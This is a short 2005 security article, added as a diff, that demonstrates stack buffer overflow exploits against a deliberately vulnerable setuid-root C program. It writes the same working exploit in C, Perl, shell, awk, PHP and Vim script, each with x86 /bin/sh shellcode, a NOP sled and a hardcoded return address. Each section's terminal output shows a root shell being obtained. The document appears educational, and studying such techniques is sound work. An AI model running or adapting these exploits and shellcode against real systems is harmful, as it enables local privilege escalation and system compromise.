@@ -1,0 +1,315 @@
+
+
+
+              Overflow Exploits & Programming Languages Collection
+
+
+
+
+ Overflow exploits are not only compiled by C. Instead, they can be compiled
+by almost any programming language. The examples in this article are tested
+on Linux and demonstrated by overflow exploits compiled by C, Perl, Shell 
+and Awk. The reason for this choice is that almost all these languages are 
+bundled with Unix (except for C in commercial Unix systems). 
+
+In the following examples accurate location is implemented basically by placeing
+SHELLCODE to environment variables. 
+
+
+
+<1> vul.c that is vulnerable to overflow
+
+[cloud@test]$ id
+uid=505(cloud) gid=503(test) groups=503(test)
+[cloud@test]$ cat vul.c
+/* Demo 
+   Have a bof vul at argv[1].
+   Write by watercloud @ xfocus.org 
+*/
+#include<stdio.h>
+int main(int argc,char  * argv[])
+{
+        char buff[32];
+        if(argc > 1)
+        {
+                strcpy(buff,argv[1]);
+        }
+        printf("buff : %s\n",buff);
+        return 0;
+}
+[cloud@test]$ gcc vul.c -o vul
+[cloud@test]$ ls -l vul
+-rwxr-xr-x    1 cloud    test      11627  2ÔÂ 24 10:14 vul
+[cloud@test]$ sudo chown root vul
+[cloud@test]$ sudo chmod u+s vul
+[cloud@test]$ ls -lh vul
+-rwsr-xr-x    1 root     test        11K  2ÔÂ 24 10:14 vul
+
+
+
+
+
+<2> C exploit ex.c
+
+
+[cloud@test]$ cat ex.c
+/* Demo for exploit bof of "./vul" 
+   Write by watercloud @ xfocus.org 
+*/
+#include <stdio.h>
+#define TARGET "./vul"
+#define ADDR 0xbffff3e8
+char SH[]="1\xc0PPP[YZ4\xd0\xcd\x80"
+          "j\x0bX\x99Rhn/shh//biT[RSTY\xcd\x80";
+int main(int argc,char * argv[])
+{
+        char env_buff[4000];
+        char cmd_buff[1024];
+        int i,ret;
+        unsigned int *pi;
+        char * pc;
+
+        for(i=0;i<3096;env_buff[i++]=0x90){ };
+        env_buff[i]='\0';
+        strcat(env_buff,SH);
+        setenv("KK",env_buff,1);
+        strcpy(cmd_buff,TARGET);
+        pc=&cmd_buff[strlen(TARGET)];
+        *pc++=' ';
+        for(ret=1,i=0;i<4 && ret;i++)
+        {
+                int j;
+                *pc++='A';
+                pi=(unsigned int *)pc;
+                for(j=0;j<20;*pi++=ADDR,j++){};
+                *pi=0;
+                ret=system(cmd_buff);
+        }
+        return ret;
+
+}
+[cloud@test]$ gcc ex.c -o ex
+[cloud@test]$ ./ex
+buff : Aèóÿ¿è?¿è?¿è?¿è?¿è?¿è?¿è?¿è?¿è?¿è?¿è?¿è?¿è?¿è?¿è?¿è?¿è??
+èóÿ¿è??
+buff : AAèóÿ¿è?¿è?¿è?¿è?¿è?¿è?¿è?¿è?¿è?¿è?¿è?¿è?¿è?¿è?¿è?¿è?¿è?
+¿è?¿è??
+buff : AAAèóÿ¿è?¿è?¿è?¿è?¿è?¿è?¿è?¿è?¿è?¿è?¿è?¿è?¿è?¿è?¿è?¿è?¿è?
+ÿ¿è?¿è??
+buff : AAAAèóÿ¿è?¿è?¿è?¿è?¿è?¿è?¿è?¿è?¿è?¿è?¿è?¿è?¿è?¿è?¿è?¿è?¿è
+?¿è?¿è??
+sh-2.05b# id
+uid=0(root) gid=503(test) groups=503(test)
+sh-2.05b# exit
+exit
+
+
+
+
+
+<3> perl exploit ex.pl
+
+
+[cloud@test]$ cat ex.pl
+
+#!/usr/bin/perl
+# Demo for exploit bof of "./vul"
+# Write by watercloud @ xfocus.org
+
+#$ENV_LEN=`env |wc -c`
+$SHELL="1\xc0PPP[YZ4\xd0\xcd\x80j\x0bX\x99Rhn/shh//biT[RSTY\xcd\x80";
+$ENV{KK}= "\x90"x 3096 . $SHELL;
+for($ret=1,$ag="AA",$i=0;$i<4 && $ret; $ag="A"x $i++) {
+  $ret=system "./vul",$ag. "\xff\xbf\xe8\xf3"x20;  #ADDR:0xbffff3e8
+}
+#EOF
+[cloud@test]$ perl ex.pl
+buff : AAÿ¿è?¿è?¿è?¿è?¿è?¿è?¿è?¿è?¿è?¿è?¿è?¿è?¿è?¿è?¿è?¿è?¿è?¿è
+?¿è?¿è?
+sh-2.05b# id
+uid=0(root) gid=503(test) groups=503(test)
+sh-2.05b# exit
+exit
+
+
+
+
+<4> Shell exploit ex.sh
+
+[cloud@test]$ cat ex.sh
+#/bin/bash
+# Demo for exploit bof of "./vul"
+# Write by watercloud @ xfocus.org
+
+#ENV_LEN=`env |wc -c|tr -d ' '`
+SH="1\xc0PPP[YZ4\xd0\xcd\x80j\x0bX\x99Rhn/shh//biT[RSTY\xcd\x80";
+AG="AA";for (( i=0;i<10;i++));do AG=$AG$AG;done ;AG=$AG$AG$AG #3096
+for((i=0;i<20;i++));do AD=$AD"\xff\xbf\xe8\xf3";done #ADDR:0xbffff3e8
+export AGSHELL=$AG`echo -e $SH`
+
+for((i=0;i<4;i++)) ;do
+  AA=$AA"A"
+  if  ./vul $AA`echo -e $AD`
+  then break
+  fi
+done
+#EOF
+[cloud@test]$ chmod a+x ex.sh
+[cloud@test]$ ./ex.sh
+buff : Aÿ¿è?¿è?¿è?¿è?¿è?¿è?¿è?¿è?¿è?¿è?¿è?¿è?¿è?¿è?¿è?¿è?¿è?¿è?
+ÿ¿è?¿è?
+./ex.sh: line 16:  5287 ¶Î´íÎó                  ./vul $AA`echo -e $AD`
+buff : AAÿ¿è?¿è?¿è?¿è?¿è?¿è?¿è?¿è?¿è?¿è?¿è?¿è?¿è?¿è?¿è?¿è?¿è?¿è
+?¿è?¿è?
+sh-2.05b# id
+uid=0(root) gid=503(test) groups=503(test)
+sh-2.05b# exit
+exit
+
+
+
+
+
+<5> awk exploit ex.awk
+
+[cloud@test]$ cat ex.awk
+# Demo for exploit bof of "./vul"
+# Write by watercloud @ xfocus.org
+
+BEGIN{
+        SH="1\xc0PPP[YZ4\xd0\xcd\x80j\x0bX\x99Rhn/shh//biT[RSTY\xcd\x80";
+        AG="AA";
+        for ( i=0;i<10;i++)
+        {
+                AG=AG""AG;
+        }
+        AG=AG""AG""AG #3096
+        for(i=0;i<20;i++)
+        {
+                AD=AD"\xe8\xf3\xff\xbf"; #ADDR:0xbffff3e8
+        }
+
+        AA="AA"
+        for(i=0;i<4;i++)
+        {
+          AA=AA"A"
+          system("./vul "AA""AD" "AG""SH)
+        }
+}
+#EOF
+[cloud@test]$ gawk -f ex.awk /dev/null
+buff : AAAèóÿ¿è?¿è?¿è?¿è?¿è?¿è?¿è?¿è?¿è?¿è?¿è?¿è?¿è?¿è?¿è?¿è?¿è?¿è?¿è??
+buff : AAAAèóÿ¿è?¿è?¿è?¿è?¿è?¿è?¿è?¿è?¿è?¿è?¿è?¿è?¿è?¿è?¿è?¿è?¿è?¿è?¿è??
+sh-2.05b# id
+uid=0(root) gid=503(test) groups=503(test)
+sh-2.05b# 
+
+
+
+
+<6> PHP exploit
+
+[cloud@MagicLinux tmp]$ id
+uid=502(cloud) gid=502(cloud) groups=502(cloud)
+[cloud@MagicLinux tmp]$ ls -l vul
+-rwsr-xr-x  1 root root 4895  2ÔÂ 26 20:57 vul
+[cloud@MagicLinux tmp]$ cat ex.php
+<?php
+$SH="1\xc0PPP[YZ4\xd0\xcd\x80j\x0bX\x99Rhn/shh//biT[RSTY\xcd\x80";
+$AG="AA";
+for( $i=0;$i<10;$i++){
+        $AG.=$AG;
+}
+$AG.=$AG.$AG; #3096
+
+for($i=0;$i<20;$i++) {
+        $AD.="\xff\xbf\xe8\xf3";#ADDR:0xbffff3e8
+}
+for($i=0;$i<4;$i++) {
+  $AA.="A";
+  print system("./vul ".$AA.$AD.$AG.$SH);
+}
+?>
+[cloud@MagicLinux tmp]$ php ex.php 1>/dev/null
+id >&2
+uid=0(root) gid=502(cloud) groups=502(cloud)
+exit
+[cloud@MagicLinux tmp]$ 
+
+
+
+
+
+<7> Vim extension script exploit
+
+Even extension programming script of vim compiler can be used to write an
+overflow exploit.
+
+[cloud@MagicLinux tmp]$ id
+uid=502(cloud) gid=502(cloud) groups=502(cloud)
+[cloud@MagicLinux tmp]$ cat ex.vim
+let SH="1\xc0PPP[YZ4\xd0\xcd\x80j\x0bX\x99Rhn/shh//biT[RSTY\xcd\x80"
+let AG="AA"
+let i=0
+while(i<10)
+        let AG=AG.AG
+        let i=i+1
+endwhile
+let AG=AG.AG.AG
+"len of AG is 3096
+
+let AD=""
+let i=0
+while(i<20)
+        let AD=AD."\xff\xbf\xe8\xf3"
+"ADDR:0xbffff3e8
+        let i=i+1
+endwhile
+
+let AA=""
+let i=0
+while(i<4)
+  let AA=AA."A"
+  execute "!./vul ". AA . AD . AG . SH
+  let i=i+1
+endwhile
+[cloud@MagicLinux tmp]$ ls -l vul
+-rwsr-xr-x  1 root root 4895  2ÔÂ 26 20:57 vul
+[cloud@MagicLinux tmp]$ vim -eS ex.vim
+Xlib: connection to ":0.0" refused by server
+Xlib: No protocol specified
+
+
+buff : A&#65533;¿è&#65533;¿è&#65533;¿è&#65533;¿è&#65533;¿è&#65533;¿è&#65533;¿è&#65533;
+¿è&#65533;¿è&#65533;¿è&#65533;¿è&#65533;¿è&#65533;¿è&#65533;¿è&#65533;¿è&#65533;¿è&#65
+533;¿è&#65533;¿è&#65533;¿è&#65533;¿èóAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+¡­¡­¡­¡­¡­¡­¡­¡­¡­¡­¡­¡­¡­¡­¡­¡­¡­¡­¡­¡­¡­¡­¡­¡­¡­¡­
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA1ÀPPP[YZ4ÐÍ&#65533;j
+                                                                   X™Rhn/shh//biT[RSTYÍ€
+sh-2.05b# id
+uid=0(root) gid=502(cloud) groups=502(cloud)
+sh-2.05b# 
+
+
+<8> ........
+
+
+
+<9> Summary
+
+
+The basis of overflow is address location, usage of data structure such as heap, 
+and architechure the organization/OS is running on. Knowing these we can understand
+that overflow exploit itself is unrelated to programming language.  
+
+
+Thanks Hou HanShu translate this paper to English.
+
+
+                                                    watercloud [at] xfocus.org
+
+                                                          2005-3-2 
+
+
+
